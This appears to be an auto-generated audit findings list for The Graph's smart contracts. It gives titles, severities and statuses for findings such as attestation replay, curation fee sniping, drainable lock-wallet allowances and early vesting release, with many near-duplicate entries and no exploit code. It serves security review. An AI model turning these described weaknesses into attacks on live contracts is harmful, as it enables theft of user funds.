# thegraph - Findings Report
## Commit hash: 023b7fdc8558-52b5356d3efea1508396b7f46a18854fb7ae9112-6c9e580c961d7e97c37e9f94162eda24a305f3f1

##Findings by Status


Finding Status: Valid


[M-1]. GraphTokenLock release after revocation can overcount released plus revoked amounts and brick accounting views
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: RequiresRole


[L-2]. Second undelegation postpones already-unbonding delegated tokens in StakingExtension._undelegate
**Derived From** : MaturityorGatingByPass / temporal lock invariant
Finding Status: Valid
Privilege: Permissionless


[H-3]. Just-in-time mint before L2Curation.collect lets attacker siphon pending curation fees
**Derived From** : MaturityorGatingByPass / fee collection has no pre-collect signal eligibility snapshot
Finding Status: Valid
Privilege: Permissionless


[H-4]. Locked stake verifier whitelist bypass in HorizonStaking.provision enables slash-based extraction to unallowed verifier
**Derived From** : GovernanceDelegationFlaw
Finding Status: Valid
Privilege: RequiresRole


[M-5]. Bearer vouchers let mempool copiers consume allocations before legitimate redeemMany batches
**Derived From** : DoubleExecutionOrReplay
Finding Status: Valid
Privilege: Permissionless


[H-6]. Missing slippage bounds on L1GNS curation lifecycle burns lets MEV extract curator GRT
**Derived From** : SlippageMissingOrInsufficient
Finding Status: Valid
Privilege: Permissionless


[H-7]. Missing L1 sender allowlist lets any bridged deposit trigger L2GraphTokenGateway callhooks
**Derived From** : AccessControlOrAuthByPass: missing allowlist guard for hook-enabled bridge deposits
Finding Status: Valid
Privilege: Permissionless


[M-8]. Live stake read lets disputed indexer reduce slashable stake before dispute acceptance
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[H-9]. Query attestations can be replayed by new fishermen to repeatedly slash the same indexer
**Derived From** : PermitOrSignatureReplay / DoubleExecutionOrReplay
Finding Status: Valid
Privilege: Permissionless


[M-10]. EpochManager.setEpochLength can retroactively advance epochs and allow runEpoch twice in one original epoch interval
**Derived From** : DoubleExecutionOrReplay
Finding Status: Valid
Privilege: RequiresAdminRole


[H-11]. Wallet owner can replace manager and let beneficiary bypass vesting through fallback token transfers
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: RequiresRole


[M-12]. Late delegators can capture historical staking rewards by joining before reward distribution
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[H-13]. Late curators can sandwich Curation.collect to steal pending query-fee reserves from existing signal holders
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[M-14]. Unchecked periods can unlock all managed GRT before endTime or make active locks unreleasable
**Derived From** : ConfigFootgun: unchecked release schedule parameters can brick or accelerate token-lock flows
Finding Status: Valid
Privilege: Permissionless


[H-15]. Replayable query attestations allow duplicate fishermen to slash the same indexer repeatedly
**Derived From** : PermitOrSignatureReplay / DoubleExecutionOrReplay
Finding Status: Valid
Privilege: Permissionless


[M-16]. Governance-accepted 100% delegation tax bricks StakingExtension.delegate and redelegation flows
**Derived From** : ConfigFootgun
Finding Status: Valid
Privilege: RequiresAdminRole


[M-17]. Late delegators can sandwich collect and transferDelegationToL2 to siphon historical delegation rewards
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[M-18]. Delegator reward split uses live delegation pool state at collection time instead of accrual-time snapshots
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[H-19]. Late delegators can sandwich reward collection and bridge historical delegation rewards from L1Staking
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[H-20]. Domainless AllocationExchange voucher signatures can be replayed across exchange deployments to double-collect GRT
**Derived From** : PermitOrSignatureReplay / ReplayAcrossForksOrL2s: voucher signatures are not bound to contract or chain domain
Finding Status: Valid
Privilege: Permissionless


[M-21]. Disputed indexer can reduce live stake before acceptance to shrink or avoid slashing
**Derived From** : GlobalParamMidFlowManipulation
Finding Status: Valid
Privilege: Permissionless


[H-22]. Collector can front-run matured PaymentsEscrow withdrawals and drain thawed escrow funds
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: Permissionless


[H-23]. Same query attestation can be replayed by different fishermen to slash an indexer multiple times
**Derived From** : DoubleExecutionOrReplay / PermitOrSignatureReplay
Finding Status: Valid
Privilege: Permissionless


[M-24]. Stale l2Done is not reset on repeated L1 subgraph receive, permanently blocking L2 finalization
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: RequiresRole


[L-25]. mint() accepts positive deposits that mint zero GCS in existing curated pools
**Derived From** : ERC4626SharePriceMismatch
Finding Status: Valid
Privilege: Permissionless


[H-26]. Removed token destinations retain max allowance and can still pull locked wallet GRT
**Derived From** : AccessControlOrAuthByPass: removed token destinations keep previously granted wallet allowance
Finding Status: Valid
Privilege: Permissionless


[H-27]. L1-transferred wallets can be initialized with invalid beneficiary or schedule and permanently lock bridged GRT
**Derived From** : InitOrderOrUnintialized: transferred wallet initialization must enforce base lock configuration constraints
Finding Status: Valid
Privilege: Permissionless


[H-28]. Router path can burn approved L2 GRT from arbitrary users and withdraw to attacker-controlled L1 recipient
**Derived From** : AccessControlOrAuthByPass
Finding Status: Valid
Privilege: Permissionless


[M-29]. Live thawingPeriod changes let a provider and verifier extend existing delegators' exit lock in HorizonStaking._undelegate
**Derived From** : GlobalParamMidFlowManipulation
Finding Status: Valid
Privilege: RequiresRole


[H-30]. Removed token destinations retain max allowance and can drain GraphTokenLockWallet funds
**Derived From** : AccessControlOrAuthByPass: revoked destination authorization is not bound to existing ERC20 allowances
Finding Status: Valid
Privilege: RequiresRole


[H-31]. Unsigned receiverDestination lets the data service redirect GraphTallyCollector payouts
**Derived From** : AccessControlOrAuthByPass: payout destination is not authorized by the signed RAV
Finding Status: Valid
Privilege: RequiresRole


[H-32]. RAVs omit paymentType, allowing collection from the wrong escrow bucket and consuming the intended claim
**Derived From** : PermitOrSignatureReplay: RAV signatures can be reused for an unsigned paymentType domain
Finding Status: Valid
Privilege: RequiresRole


[M-33]. Unchecked L1 subgraph ID aliasing overflows into the native L2 ID namespace
**Derived From** : EpochOrIndexMonotonicity
Finding Status: Valid
Privilege: Permissionless


[H-34]. Duplicate query attestation disputes can replay the same evidence to slash an indexer multiple times
**Derived From** : DoubleExecutionOrReplay
Finding Status: Valid
Privilege: RequiresRole


[M-35]. GraphTokenLock.release ignores revokedAmount and can make released plus revoked exceed managedAmount
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: RequiresRole


[M-36]. Truncated period duration allows GraphTokenLock beneficiaries to release all managed GRT before endTime
**Derived From** : ConfigFootgun
Finding Status: Valid
Privilege: Permissionless


[M-37]. Late delegators can front-run fee collection in L1Staking.collect to capture historical delegation rewards
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[H-38]. Fee sniping in L2Curation.collect lets same-transaction minters capture already-accrued query fees
**Derived From** : MaturityorGatingByPass / FrontrunMev
Finding Status: Valid
Privilege: Permissionless


[H-39]. Zero-minimum L2GNS.publishNewVersion can burn curator backing and leave all name signal unredeemable
**Derived From** : SlippageMissingOrInsufficient
Finding Status: Valid
Privilege: RequiresRole


[H-40]. Removed or old token destinations retain unlimited wallet allowance after revokeProtocol
**Derived From** : GlobalParamMidFlowManipulation / ConfigFootgun
Finding Status: Valid
Privilege: RequiresRole


[M-41]. Unchecked subgraph ID alias math can wrap L1 IDs into L2 native namespace
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: Valid
Privilege: RequiresRole


[M-42]. Inherited burn paths let holders reduce L2 GRT supply outside the bridge
**Derived From** : AccountingInvariantViolation: every L2 GRT supply decrease must pass through bridgeBurn and the configured gateway
Finding Status: Valid
Privilege: Permissionless


[M-43]. Denied subgraphs reclaim pre-denial rewards already snapshotted for active allocations
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: RequiresRole


[H-44]. Permissionless stale allocation close can front-run indexer POI close and permanently forfeit rewards
**Derived From** : MaturityorGatingByPass / permissionless stale allocation closure can bypass authorized POI reward distribution
Finding Status: Valid
Privilege: Permissionless


[H-45]. Zero-slippage curation burns let MEV force losses during L1GNS lifecycle migrations
**Derived From** : FlashLoanEconomicManipulation
Finding Status: Valid
Privilege: Permissionless


[H-46]. Removed token destinations retain max allowance and can drain GraphTokenLockWallet balances
**Derived From** : GlobalParamMidFlowManipulation / stale authorization after manager or destination-set changes
Finding Status: Valid
Privilege: RequiresRole


[H-47]. Removed token destinations keep max wallet allowances and can drain locked GRT after revocation
**Derived From** : AccessControlOrAuthByPass
Finding Status: Valid
Privilege: Permissionless


[H-48]. Late delegator can front-run SubgraphService.collect and capture historical indexing rewards
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[L-49]. Related conflict dispute is marked Drawn without DisputeDrawn event in DisputeManager.drawDispute
**Derived From** : AccountingInvariantViolation: every dispute status transition to Drawn must emit a matching DisputeDrawn event for that same disputeID
Finding Status: Valid
Privilege: RequiresRole


[M-50]. Pre-curation frontrun DoS blocks L1GNS.publishNewVersion for target deployments
**Derived From** : GovernanceFrontrunDoS
Finding Status: Valid
Privilege: Permissionless


[M-51]. Dust pre-curation can permanently block GNS.publishNewVersion for a target deployment
**Derived From** : FrontrunMev
Finding Status: Valid
Privilege: Permissionless


[H-52]. Zero-min curation remint lets MEV sandwich GNS upgrades and extract curator value
**Derived From** : FlashLoanEconomicManipulation
Finding Status: Valid
Privilege: Permissionless


[M-53]. Late delegators can front-run reward distribution and capture historical delegation rewards
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[L-54]. HorizonStakingBase.getThawedTokens uses provision thawing state for delegation requests and can revert or misreport
**Derived From** : AccountingInvariantViolation: delegation thaw getters must use delegation-pool thawing accounting
Finding Status: Valid
Privilege: Permissionless


[L-55]. Inherited burn functions let non-gateway callers reduce L2 supply outside bridgeBurn
**Derived From** : AccountingInvariantViolation: every L2 supply decrease must go through bridgeBurn and emit BridgeBurned
Finding Status: Valid
Privilege: Permissionless


[M-56]. Floor-rounded periods allow GraphTokenLock to release more than managedAmount before endTime
**Derived From** : ConfigFootgun: floor-rounded period duration causes schedule/accounting invariant violation
Finding Status: Valid
Privilege: RequiresRole


[H-57]. Removed token destinations retain max allowances and can keep pulling locked GRT
**Derived From** : AllowanceRace / AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[L-58]. Existing Curation pools allow split dust mints to avoid curation tax due to floor rounding
**Derived From** : FeeAccountingDrift / PrecisionDriftAccumulation: curation tax floors to zero on existing-pool dust mints
Finding Status: Valid
Privilege: Permissionless


[H-59]. Just-in-time minting before Curation.collect lets attackers siphon pending query-fee reserves
**Derived From** : AccountingInvariantViolation: collected fees are assigned to live curation signal instead of a pre-collection snapshot
Finding Status: Valid
Privilege: Permissionless


[M-60]. Unchecked alias arithmetic lets large L1 subgraph IDs wrap into the native L2 namespace
**Derived From** : DivideByZeroOrOverFlowInCustomMath: L1/L2 subgraph aliasing must be bijective for accepted IDs
Finding Status: Valid
Privilege: Permissionless


[H-61]. Just-in-time curation around Curation.collect lets MEV searchers steal query-fee reserve increases from existing curators
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[H-62]. Removed token destinations retain max allowances and can drain locked GraphTokenLockWallet funds
**Derived From** : AllowanceRace / stale allowance invariant: removed token destinations must not retain wallet allowances
Finding Status: Valid
Privilege: RequiresRole


[M-63]. Dust stake front-run can brick an indexer's full L2 stake migration
**Derived From** : MaturityorGatingByPass: state-gate manipulation around L2 migration
Finding Status: Valid
Privilege: Permissionless


[M-64]. Invalid periods greater than duration bricks release and revoke during the lock schedule
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: Valid
Privilege: RequiresAdminRole


[M-65]. Surplus tokens can be recorded as released after revoke, corrupting lock accounting
**Derived From** : releasedAmount + revokedAmount <= managedAmount must always hold
Finding Status: Valid
Privilege: RequiresRole


[M-66]. Flooring period duration allows full release before GraphTokenLockWallet.endTime
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: RequiresRole


[H-67]. Query dispute evidence can be replayed by different fishermen to create multiple slashable disputes
**Derived From** : DoubleExecutionOrReplay
Finding Status: Valid
Privilege: Permissionless


[H-68]. Replayable query attestations allow duplicate dispute rewards and repeated indexer slashing
**Derived From** : DoubleExecutionOrReplay
Finding Status: Valid
Privilege: Permissionless


[H-69]. Stale allocator blockAppliedTo ignored allows paused issuance to accrue in RewardsManager.updateAccRewardsPerSignal
**Derived From** : StaleOracleAcceptance
Finding Status: Valid
Privilege: Permissionless


[H-70]. Lifecycle curation burns use zero slippage bounds, allowing MEV to extract curator value during upgrades or L2 migration
**Derived From** : SlippageMissingOrInsufficient
Finding Status: Valid
Privilege: Permissionless


[M-71]. Live thawingPeriod changes can trap existing HorizonStaking delegators in a longer withdrawal delay
**Derived From** : GlobalParamMidFlowManipulation
Finding Status: Valid
Privilege: RequiresRole


[H-72]. Fee collect can be front-run to capture already-accrued curation fees in L2Curation.collect
**Derived From** : FeeAccountingDrift
Finding Status: Valid
Privilege: Permissionless


[H-73]. Verifier reward path lets colluding verifier bypass HorizonStaking.slash thawing and extract provisioned GRT
**Derived From** : CrossRoleCollusionWithoutSlashing
Finding Status: Valid
Privilege: RequiresRole


[L-74]. Missing DisputeDrawn event for related conflict in DisputeManager.drawDispute desynchronizes dispute status indexers
**Derived From** : StandardViolation: every dispute status transition to Drawn must emit a matching DisputeDrawn event
Finding Status: Valid
Privilege: RequiresRole


[M-75]. Indexing dispute rewards can be stolen by frontrunning the first dispute for an allocation
**Derived From** : FirstOrLastMoverAdvantage
Finding Status: Valid
Privilege: Permissionless


[H-76]. GraphTokenLockWallet.revokeProtocol cannot clear allowances for removed or old-manager destinations
**Derived From** : Allowance authority drift after token destination removal or manager change
Finding Status: Valid
Privilege: RequiresRole


[H-77]. Same query attestation can be replayed by different fishermen to create multiple slashable disputes
**Derived From** : DoubleExecutionOrReplay
Finding Status: Valid
Privilege: Permissionless


[L-78]. Inherited burn functions let L2GraphToken supply be destroyed outside bridgeBurn
**Derived From** : AccountingInvariantViolation: every L2 supply decrease must occur only through gateway bridgeBurn
Finding Status: Valid
Privilege: Permissionless


[H-79]. Indexer can change delegation reward cuts before settlement to redirect pending delegator rewards
**Derived From** : GlobalParamMidFlowManipulation
Finding Status: Valid
Privilege: Permissionless


[H-80]. RewardsManager accrues and mints rewards from stale paused issuance allocator rates
**Derived From** : StaleOracleAcceptance / allocator blockAppliedTo freshness must gate reward accrual
Finding Status: Valid
Privilege: Permissionless


[H-81]. Live curation state lets MEV redirect query-fee curation cut in SubgraphService._collectQueryFees
**Derived From** : SandwichableOracle / SlippageMissingOrInsufficient
Finding Status: Valid
Privilege: Permissionless


[H-82]. L2 token lock owner can replace the wallet manager and approve an arbitrary spender to drain locked GRT before maturity
**Derived From** : MaturityorGatingByPass / AccessControlOrAuthByPass
Finding Status: Valid
Privilege: Permissionless


[M-83]. Floored periodDuration lets availableAmount exceed managedAmount before endTime
**Derived From** : PricePrecisionOrRoundingError
Finding Status: Valid
Privilege: RequiresRole


[L-84]. Delegation minimum is checked before tax, allowing active delegated positions below MINIMUM_DELEGATION
**Derived From** : AccountingInvariantViolation / PricePrecisionOrRoundingError
Finding Status: Valid
Privilege: Permissionless


[H-85]. Removed GraphTokenLockWallet token destinations keep unlimited allowance and can drain wallets after revocation
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[H-86]. Locked GRT can be provisioned to unallowed verifiers through HorizonStaking.provision and escaped via verifier slash rewards
**Derived From** : AccessControlOrAuthByPass: locked stake must only be provisioned to allowed locked verifiers
Finding Status: Valid
Privilege: Permissionless


[M-87]. Partial pause bypass in StakingExtension.withdrawDelegated allows redelegation while delegation is stopped
**Derived From** : UnprotectedPauseOrStop / MaturityorGatingByPass
Finding Status: Valid
Privilege: Permissionless


[M-88]. Live thawingPeriod changes can extend existing delegators' withdrawal lock in HorizonStaking._undelegate
**Derived From** : GlobalParamMidFlowManipulation
Finding Status: Valid
Privilege: RequiresRole


[H-89]. Stale L2 mint allowance can be frontrun to over-mint GRT and brick future L2 withdrawals
**Derived From** : GlobalParamMidFlowManipulation: live L2 mint allowance rate is used during pending L2-to-L1 withdrawal finalization before the governor update lands
Finding Status: Valid
Privilege: Permissionless


[M-90]. Late delegators can join immediately before reward distribution and capture historical rewards
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[M-91]. GraphTokenLock.release can count surplus as released managed tokens after revoke and break outstanding accounting
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: RequiresRole


[H-92]. Wallet owner can replace manager to approve a malicious token destination and drain locked GRT before vesting
**Derived From** : AccessControlOrAuthByPass
Finding Status: Valid
Privilege: RequiresRole


[H-93]. Removed token destinations keep unlimited wallet allowances because revokeProtocol only revokes current manager destinations
**Derived From** : GlobalParamMidFlowManipulation
Finding Status: Valid
Privilege: RequiresRole


[M-94]. Same-epoch allocations can be force-closed when maxPOIStaleness is zero or shorter than an epoch
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: Permissionless


[M-95]. Permissionless stale closure can terminate too-young SubgraphService allocations before first reward eligibility
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: Permissionless


[H-96]. Late delegators can sandwich reward distribution and steal accrued delegation rewards in L1Staking pools
**Derived From** : RewardCheckpointFreeRiderOrLateJoiner
Finding Status: Valid
Privilege: Permissionless


[M-97]. Permissionless stake donations can front-run and DoS full L1 stake migration or unstake
**Derived From** : MaturityorGatingByPass / front-run state-gate manipulation
Finding Status: Valid
Privilege: Permissionless


[M-98]. Delegators can bypass the unbonding period after an indexer only partially migrated to L2
**Derived From** : MaturityorGatingByPass / Temporal invariant QZ3UYuA5NTntKmfMiJQ3_
Finding Status: Valid
Privilege: Permissionless


[M-99]. Partial L2 stake transfer lets later non-bridge exit unlock delegations early
**Derived From** : GlobalParamMidFlowManipulation
Finding Status: Valid
Privilege: Permissionless


[M-100]. Post-revocation surplus lets GraphTokenLock.release over-increment releasedAmount and brick accounting views
**Derived From** : AccountingInvariantViolation: releasedAmount + revokedAmount must never exceed managedAmount
Finding Status: Valid
Privilege: RequiresRole


[H-101]. Zero-slippage curation rollover in GNS.publishNewVersion lets MEV extract curator value during upgrades
**Derived From** : SlippageMissingOrInsufficient
Finding Status: Valid
Privilege: Permissionless


[M-102]. Pre-curation front-run permanently blocks GNS.publishNewVersion for the owner's target deployment
**Derived From** : FrontrunMev
Finding Status: Valid
Privilege: Permissionless


[M-103]. Zero-signal subgraphs cannot be migrated to L2 due to division by zero in L1GNS.sendSubgraphToL2
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: Valid
Privilege: Permissionless


[H-104]. L1GNS.sendSubgraphToL2 burns all curation signal with minOut=0, allowing MEV to extract migration value
**Derived From** : SlippageMissingOrInsufficient
Finding Status: Valid
Privilege: Permissionless


[M-105]. Indexing dispute slot can be consumed before valid evidence exists, permanently blocking later disputes
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: Permissionless


[M-106]. Indexing dispute reward can be stolen by frontrunning the allocation dispute slot
**Derived From** : FirstOrLastMoverAdvantage
Finding Status: Valid
Privilege: Permissionless


[M-107]. Truncated period duration lets beneficiaries release locked GRT before endTime
**Derived From** : MaturityorGatingByPass / EpochOrIndexMonotonicity
Finding Status: Valid
Privilege: RequiresRole


[H-108]. GraphTokenLock releases all locked GRT before endTime when duration is not aligned with periods
**Derived From** : MaturityorGatingByPass / EpochOrIndexMonotonicity: vesting periods are not capped after truncating period duration
Finding Status: Valid
Privilege: RequiresRole


[M-109]. GraphPayments.collect can strand GRT when dataService or receiverDestination is GraphPayments
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[H-110]. MEV delegation frontrun can siphon GraphPayments.collect receiver proceeds into an attacker-owned pool
**Derived From** : SlippageMissingOrInsufficient
Finding Status: Valid
Privilege: Permissionless


[H-111]. Zero-slippage version upgrade in L1GNS.publishNewVersion exposes all name curators to curation sandwich loss
**Derived From** : SlippageMissingOrInsufficient
Finding Status: Valid
Privilege: Permissionless


[M-112]. Permissionless pre-curation can permanently block L1GNS.publishNewVersion for the intended deployment
**Derived From** : FrontrunMev
Finding Status: Valid
Privilege: Permissionless


[H-113]. Removed token destinations retain unlimited lock-wallet allowances after GraphTokenLockWallet.revokeProtocol
**Derived From** : AccessControlOrAuthByPass
Finding Status: Valid
Privilege: RequiresRole


[H-114]. Rounded period duration lets GraphTokenLock.release unlock all GRT before endTime
**Derived From** : MaturityorGatingByPass / PricePrecisionOrRoundingError: passedPeriods is computed from truncated periodDuration without a cap
Finding Status: Valid
Privilege: RequiresRole


[H-115]. RAV signatures omit payment parameters allowing data service to redirect or skim collections
**Derived From** : AccessControlOrAuthByPass
Finding Status: Valid
Privilege: Permissionless


[H-116]. Unsigned receiverDestination lets GraphTallyCollector.collect redirect service-provider payouts
**Derived From** : UnsafeRecipient / AccessControlOrAuthByPass: receiver payout destination must be authorized by the signed serviceProvider
Finding Status: Valid
Privilege: Permissionless


[H-117]. RAV omits paymentType so GraphTallyCollector.collect can debit an unauthorized escrow bucket
**Derived From** : AccountingInvariantViolation / AccessControlOrAuthByPass: every collection must be authorized for the exact escrow payment type debited
Finding Status: Valid
Privilege: Permissionless


[M-118]. Removed token destinations retain max allowance from token lock wallets
**Derived From** : GlobalParamMidFlowManipulation: removed token destination keeps prior wallet allowances
Finding Status: Valid
Privilege: RequiresRole


[M-119]. approveProtocol grants unlimited spending from revocable wallets despite protocol forwarding being disabled
**Derived From** : Revocable locks must not grant protocol allowances
Finding Status: Valid
Privilege: RequiresRole


[H-120]. Revocable GraphTokenLockWallet can grant max token allowances and bypass locked-token transfer restrictions
**Derived From** : MaturityorGatingByPass / AccessControlOrAuthByPass: revocable locks must not be able to move managed tokens through protocol flows before vesting
Finding Status: Valid
Privilege: Permissionless


[M-121]. Rounded periodDuration can unlock all managed tokens before endTime
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: RequiresRole


[H-122]. Rounded period duration unlocks all managed GRT before endTime
**Derived From** : PricePrecisionOrRoundingError
Finding Status: Valid
Privilege: RequiresRole


[M-123]. Release after revoke can overcount surplus as scheduled GRT and underflow outstanding accounting
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[M-124]. Floored period duration can unlock the full lock balance before endTime
**Derived From** : MaturityorGatingByPass / DivideByZeroOrOverFlowInCustomMath
Finding Status: Valid
Privilege: Permissionless


[M-125]. Surplus tokens can be counted as scheduled releases and make totalOutstandingAmount underflow
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: RequiresRole


[H-126]. Non-divisible vesting periods let GraphTokenLock.release account and transfer more than managedAmount at endTime
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[C-127]. L1 wallet key squatting in L2GraphTokenLockManager.onTokenTransfer redirects later bridged lock funds
**Derived From** : ExternalProtocolKeyCollision
Finding Status: Valid
Privilege: Permissionless


[H-128]. L2GraphTokenLockManager.onTokenTransfer lets bridged top-ups become pre-vesting surplus withdrawals
**Derived From** : AccountingInvariantViolation / MaturityorGatingByPass: additional locked-token receipts must not become withdrawable surplus before endTime
Finding Status: Valid
Privilege: Permissionless


[M-129]. Overfunded first L1 receipt creates immediate surplus in L2GraphTokenLockManager.onTokenTransfer
**Derived From** : AccountingInvariantViolation: first credited token amount should not create immediate surplus
Finding Status: Valid
Privilege: Permissionless


[H-130]. Malformed L1 wallet data can initialize an L2 lock with endTime zero and release all locked GRT immediately
**Derived From** : InitOrderOrUnintialized / MaturityorGatingByPass
Finding Status: Valid
Privilege: Permissionless


[H-131]. First bridge receipt can create immediately withdrawable surplus when amount exceeds managedAmount
**Derived From** : ConfigFootgun
Finding Status: Valid
Privilege: RequiresRole


[H-132]. AllocationExchange vouchers can be replayed across exchange deployments because signatures omit domain separation
**Derived From** : ReplayAcrossForksOrL2s / PermitOrSignatureReplay: voucher signatures are not bound to contract address, chain id, or domain
Finding Status: Valid
Privilege: Permissionless


[H-133]. Reauthorized signers resurrect stale vouchers because vouchers have no expiry or signer epoch
**Derived From** : PermitOrSignatureReplay / PermitDeadlineBypass
Finding Status: Valid
Privilege: Permissionless


[M-134]. AllocationExchange rejects documented Ethereum signed vouchers and accepts raw digests instead
**Derived From** : StandardViolation / documented Ethereum signed message mismatch
Finding Status: Valid
Privilege: Permissionless


[H-135]. Bearer vouchers can be frontrun because AllocationExchange does not bind redemptions to the intended caller
**Derived From** : MaturityorGatingByPass
Finding Status: Valid
Privilege: Permissionless


[H-136]. Replayable AllocationExchange vouchers can drain funded deployments or revived signer epochs
**Derived From** : PermitFrontRun / GlobalParamMidFlowManipulation
Finding Status: Valid
Privilege: Permissionless



Finding Status: InvalidGovernanceRisk


[L-137]. Authorized token selectors let beneficiaries bypass lock schedules through fallback forwarding
**Derived From** : AccessControlOrAuthByPass
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[L-138]. Manager can fund minimal proxies whose masterCopy has no executable code
**Derived From** : BeaconOrFactoryAuthorityDrift / InitOrderOrUnintialized
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-139]. Zero period duration bricks release and revoke during active lock schedules
**Derived From** : ConfigFootgun
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[H-140]. Inherited minter role lets L2GraphToken supply be minted outside the bridge
**Derived From** : AccountingInvariantViolation: every L2 supply increase must be backed by a gateway bridgeMint
Finding Status: InvalidGovernanceRisk
Privilege: RequiresRole


[M-141]. Division-by-zero schedule bricks GraphTokenLockWallet releases when periods exceed duration
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[L-142]. GraphTokenLockManager can deploy and fund unusable proxies when masterCopy has no code
**Derived From** : BeaconOrFactoryAuthorityDrift
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-143]. Zero period duration DoSes revocation and release during the full vesting window
**Derived From** : DivideByZeroOrOverFlowInCustomMath / periodDuration can be zero for initialized locks
Finding Status: InvalidGovernanceRisk
Privilege: RequiresRole


[H-144]. Authorized provision operator can re-register an indexer and redirect SubgraphService rewards to an attacker payment destination
**Derived From** : AccessControlOrAuthByPass
Finding Status: InvalidGovernanceRisk
Privilege: RequiresRole


[M-145]. GraphTokenLock active schedule functions revert when periods exceed duration
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: InvalidGovernanceRisk
Privilege: RequiresRole


[M-146]. Invalid period count can brick active GraphTokenLock releases and revocations
**Derived From** : ConfigFootgun: owner-configurable period count can brick flows without schedule sanity checks
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-147]. Initializer accepts schedules with zero periodDuration, breaking release and revoke during the active window
**Derived From** : DivideByZeroOrOverFlowInCustomMath / StateMachine invariant: periodDuration() > 0
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-148]. GraphTokenLock schedules with periods greater than duration brick release paths until endTime
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[L-149]. Authorized token transfer selector lets beneficiaries bypass the lock schedule through fallback forwarding
**Derived From** : MaturityorGatingByPass / AccessControlOrAuthByPass: authorized fallback selectors can target the locked token itself
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[L-150]. Non-contract masterCopy lets manager fund unusable minimal proxies
**Derived From** : BeaconOrFactoryAuthorityDrift: factory master copy can be set to a non-contract implementation
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[L-151]. Authorized token transfer selectors let beneficiaries bypass lock release schedule
**Derived From** : AccessControlOrAuthByPass
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-152]. Locks with periods greater than duration revert schedule and release functions
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-153]. Invalid periods greater than duration brick active GraphTokenLock release and revoke paths
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[L-154]. Non-contract masterCopy can create funded no-op proxies that strand managed GRT
**Derived From** : ConfigFootgun: masterCopy accepts non-contract implementations and can strand funded proxies
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-155]. Governance-accepted 100% curation tax disables new public curation and burns existing-pool deposits for zero signal
**Derived From** : UnprotectedPauseOrStop / arithmetic boundary DoS
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-156]. Invalid period configuration makes active locks divide by zero and blocks releases until endTime
**Derived From** : periodDuration() must be nonzero for every initialized lock
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-157]. GraphTokenLock schedules with periods greater than duration revert during release and revoke calculations
**Derived From** : DivideByZeroOrOverFlowInCustomMath: periodDuration can be zero when periods exceeds duration
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-158]. GraphTokenLock schedules with periods greater than duration revert until endTime
**Derived From** : DivideByZeroOrOverFlowInCustomMath: periodDuration can be zero when periods exceeds duration
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-159]. Zero periodDuration bricks active GraphTokenLock releases and revocations when periods exceed duration
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: InvalidGovernanceRisk
